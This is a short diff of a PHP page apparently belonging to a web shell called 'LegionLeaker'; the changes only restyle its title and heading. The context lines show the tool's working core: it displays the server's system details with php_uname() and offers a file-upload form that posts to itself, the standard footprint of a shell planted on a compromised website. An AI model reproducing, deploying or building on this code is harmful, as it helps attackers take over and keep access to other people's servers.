@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LegionLeaker</title>
+    <title>LegioNLeakeR</title>
     <style>
         body {
             background-color: #1C1678;
@@ -30,7 +30,7 @@
 
 <body>
     <div class="s">
-        <h1>LegionLeaker</h1>
+        <h1>LegioNLeakeR</h1>
         <p><?= "Uname: " . php_uname(); ?></p>
         <form action="<?= $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
             <input type="file" name="f" class="image">
